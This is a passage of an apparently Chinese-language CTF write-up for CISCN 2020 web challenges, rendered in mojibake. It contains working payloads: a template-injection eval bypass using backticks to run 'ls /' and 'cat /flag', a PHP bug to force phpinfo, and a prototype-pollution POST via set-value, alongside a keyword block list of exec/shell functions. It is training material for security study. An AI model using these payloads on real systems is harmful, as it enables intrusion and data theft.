<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä»£ç ï¼Œä¼šå‘ç°èƒ½åˆ©ç”¨çš„ç‚¹å°±æ˜¯<code>call_user_func_array</code>å‡½æ•°ï¼Œä¼šå‘ç°è¿™é‡Œæœ‰å››ä¸ªä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œgoogleä¸€ä¸‹å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ•´ç†äº†phpçš„bugçš„ç½‘ç«™ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« <a href="https://bugs.php.net/bug.php?id=79982ï¼Œæ–‡ç« é‡Œæåˆ°äº†ä¸€ç§å¼‚å¸¸é€€å‡ºçš„æ–¹æ³•" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79982ï¼Œæ–‡ç« é‡Œæåˆ°äº†ä¸€ç§å¼‚å¸¸é€€å‡ºçš„æ–¹æ³•</a></p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png" class="">

<p>åˆšå¥½è¿™é“é¢˜è¦è®©ç¨‹åºå¼‚å¸¸é€€å‡ºï¼Œå°±ä¼šè¿›å…¥åˆ°phpinfo()</p>
<p>æ ¹æ®æ–‡ç« é‡Œçš„pocï¼Œæˆ‘ä»¬åˆ©ç”¨<code>stream_socket_client</code>å‡½æ•°æ¥è§¦å‘æŠ¥é”™ï¼Œå¾—åˆ°<code>phpinfo()</code></p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png" class="">

<p>å¼€å§‹æ‹¿åˆ°è¿™ä¸ªé¡µé¢ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹æ¥ä¸€ä¸‹<code>disable_function</code>,éƒ½å¯ä»¥ç”¨ï¼ŒåŠ ä¸Šè¿™é¢˜å¾ˆå¿«è¢«æ‰“ç©¿ï¼Œåº”è¯¥æ²¡é‚£ä¹ˆéš¾ï¼Œæœç´¢ä¸€ä¸‹<code>flag{</code>,ç›´æ¥æ‰¾åˆ°äº†</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png" class="">

<h2 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>å‘½ä»¤æ‰§è¡Œ</li>
<li>åå¼•å·</li>
<li>phpè¾“å‡ºæ–¹æ³•</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€'</span>.$val.<span class="string">'ã€‘'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€'</span>.$ifstr.<span class="string">'ã€‘'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°</p>
<p>ç”±äºä¸äº†è§£parserIfLabelçš„ç”¨æ³•ï¼Œåœ¨googleçš„æ—¶å€™æ‰¾åˆ°äº†ä¸€æ ·çš„æºç å’Œpocï¼Œæ˜¯ä¸€ä¸ªcveçš„éƒ¨åˆ†å†…å®¹</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png" class="">

<p>è¿™ä¸ªGitHubåœ°å€ç»™äº†pocä½†æ˜¯æ‰“ä¸é€šï¼Œç¨å¾®å’ŒåŸé¢˜æœ‰åŒºåˆ«<a href="https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md" target="_blank" rel="noopener">https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md</a></p>
<p>åæ¥åˆæ‰¾åˆ°äº†å¦ä¸€ç¯‡blogï¼Œæœ¬è´¨æ— åŒºåˆ«<a href="https://blog.csdn.net/CSDNPM250/article/details/104211233" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/104211233</a></p>
<p>æ€»çš„æ¥è¯´æ‹¿åˆ°æ‰‹çš„pocå½¢å¼å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(phpinfo());&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåœ¨æœ¬æ¬¡æµ‹è¯•å¯ä»¥å‘ç°phpæ˜¯è¢«è¿‡æ»¤äº†çš„ï¼Œå¤§å°å†™åŒå†™éƒ½æ˜¯æ— æ³•ç»•è¿‡çš„</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png" class="">

<p>è¿™é‡Œå°±è¦æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½å¤Ÿæ‹¿åˆ°å›æ˜¾ï¼Œçªç„¶æƒ³åˆ°æˆ‘å¯ä»¥é¿å¼€phpinfoæ‹¿å›æ˜¾å•Šï¼Œè¿™å‡ ç¯‡blogäº§ç”Ÿäº†è¯¯å¯¼ï¼Œæ­»æ´»è¦æ‹¿phpinfoçš„å›æ˜¾</p>
<p>ç›´æ¥ç”¨echo æ‰“å°ç›®å½•å¥½åƒä¹Ÿå¯ä»¥ï¼Œå†åŠ ä¸Šåå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œåå¼•å·çš„ä½œç”¨ç›¸å½“äºå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°åœ¨ç™½ç›’ä¸­è¢«banå®Œäº†ï¼Œä½†æ˜¯åå¼•å·æ›´å¥½ç”¨ï¼Œåå¼•å·ç›¸å½“äºå‘½ä»¤æ‰§è¡Œå‡½æ•°å¹¶ä¸”èƒ½æŠŠæ‰§è¡Œç»“æœè¿”å›</p>
<p>ç”±äºå®¹å™¨å…³äº†å°±ç»™pocå§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(&#96;ls &#x2F;&#96;);&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨æ ¹ç›®å½•ä¸‹é¢ä¼šå‘ç°flagæ–‡ä»¶ï¼Œç”¨catè¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¼Ÿa&#x3D;&#123;if:1)echo(&#96;cat &#x2F;flag&#96;);&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png" class="">

<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>nodejsåŸç”Ÿé“¾æ±¡æŸ“</li>
<li><code>set-value</code>çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>é¢˜ç›®ç»™äº†é™„ä»¶ï¼Œè§£å‹æ‹–åˆ°sublineé‡Œ,çœ‹äº†è€åŠå¤©å‘ç°åªç”¨çœ‹ä¸‹é¢è¿™ä¸¤ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png" class="">

<p>nodejsåŸºæœ¬ä¸å¤ªä¼šï¼Œå…ˆæ‰¾äº†ç¯‡æ–‡ç« çœ‹çœ‹åŸå‹é“¾æ±¡æŸ“çš„åŸç†ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦åˆ©ç”¨åˆ°<code>__proto__</code>å±æ€§ï¼Œä¸‹é¢æ˜¯æ–‡ç« é‡Œæ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†</p>
<p>ç»§æ‰¿çš„æŸ¥æ‰¾è¿‡ç¨‹:</p>
<p>â€ƒâ€ƒè°ƒç”¨å¯¹è±¡å±æ€§æ—¶, ä¼šæŸ¥æ‰¾å±æ€§ï¼Œå¦‚æœæœ¬èº«æ²¡æœ‰ï¼Œåˆ™ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ„é€ å‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œä¹Ÿæœ‰<code>__proto__</code>ï¼Œé‚£ä¹ˆä¼šå»<code>__proto__</code>çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œä¸€ç›´åˆ°null</p>
<p>åˆ°è¿™é‡ŒåŸç†å·®ä¸å¤šäº†ï¼Œä¸‹é¢å°±æ˜¯åˆ†æäº†</p>
<p>åœ¨çœ‹åˆ°<code>const setFn = require(&#39;set-value&#39;);</code>ä¸æ˜¯å¾ˆç†è§£ï¼Œgoogleçš„æ—¶å€™æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« </p>
<p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<p>æ–‡ç« é‡Œçš„pocæ²¡ææ‡‚åˆ°åº•é‡å†™äº†å•¥ï¼Œæœ‰æ²¡æœ‰é‡å†™ï¼Œä½†æ˜¯çŸ¥é“çš„æ˜¯å¾—ä»setFn()å…¥æ‰‹ï¼Œç›´æ¥è·Ÿè¿›setFn()</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png" class="">

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œåœ¨è®¿é—®/Privilegeæ—¶ï¼Œå¯ä»¥ä¼ å…¥èµ‹å€¼keyå’Œvalue</p>
<p>ä¸‹é¢å°±æ˜¯è·Ÿè¿›setFn()çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°session()ï¼Œåœ¨app.jsä¸­æœ‰ä¸‹é¢å¯¹Sessionçš„å‚æ•°å®šä¹‰</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png" class="">

<p>è¿™é‡Œæœ‰envï¼ŒæŸ¥ä¸€ä¸‹æ„æ€å°±æ˜¯ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ±¡æŸ“çš„åº”è¯¥å°±æ˜¯Sessionäº†ï¼Œsessionåˆåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªé‡è¦ç‚¹ï¼Œå…ˆæ”¾ç€</p>
<p>ä¸‹é¢å†æ¥çœ‹ä¸€ä¸‹è·å–flagçš„æ¡ä»¶</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Admin[key]çš„å€¼å’Œpasswordçš„å€¼åªè¦èƒ½å¤Ÿç›¸ç­‰ï¼Œå°±ä¼šç»™åˆ°åœ¨ç¯å¢ƒå˜é‡ä¸­çš„flagï¼Œè¿™é‡Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Adminçš„å®šä¹‰ä¹Ÿæ˜¯åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”¨åŸå‹é“¾æ±¡æŸ“è¦†ç›–ï¼Œç”¨ä¸Šé¢åˆ†æçš„å¾€ç¯å¢ƒå˜é‡ä¸­å†™å…¥</p>
<p>åˆå› ä¸º<strong>æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalue</strong></p>
<p>æ‰€ä»¥æˆ‘çŒœæµ‹æ±¡æŸ“sessionå†™å…¥ç¯å¢ƒå˜é‡ï¼Œåœ¨åˆ¤æ–­æ—¶æ‰¾ä¸åˆ°Adminä¸­å¯¹åº”çš„å€¼æ—¶ä¼šç»§ç»­å‘å‰æ‰¾ï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„sessionï¼Œç°åœ¨æ•´ä¸ªæ€è·¯åº”è¯¥å°±æ¸…æ™°äº†ï¼Œä¸Špoc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Privilege</span><br><span class="line"></span><br><span class="line">POSTï¼šNewAttributeKey&#x3D;__proto__.peguin&amp;NewAttributeValue&#x3D;123</span><br></pre></td></tr></table></figure>

<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png" class="">

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸå†™åˆ°äº†ç¯å¢ƒå˜é‡ä¸­ï¼Œå¹¶ä¸”ä¼šç”Ÿæˆæ–°çš„é”®å€¼å¯¹ï¼Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯è¿™ç§æ ¼å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; __proto__: &#123; peguin: 123 &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>yå› ä¸ºAdminæœ¬èº«æ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œå°±ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬åªè¦å»postä¼ å‚keyä¸ºpeguinï¼Œvalueä¸º123å°±å¯ä»¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">postï¼škey&#x3D;peguin&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>

<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png" class="">

<h2 id="Easytrick"><a href="#Easytrick" class="headerlink" title="Easytrick"></a>Easytrick</h2><p>è¿™é¢˜æ²¡åšå‡ºæ¥æŒºé—æ†¾çš„ï¼Œèµ›åå¤ç°ä¸€ç‚¹ä¸éš¾ï¼Œä¹‹å‰æ¥è§¦è¿‡çš„ç‚¹</p>
<h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>æ•´å‹å’Œå­—ç¬¦ä¸²ç²¾åº¦é—®é¢˜</li>
</ul>
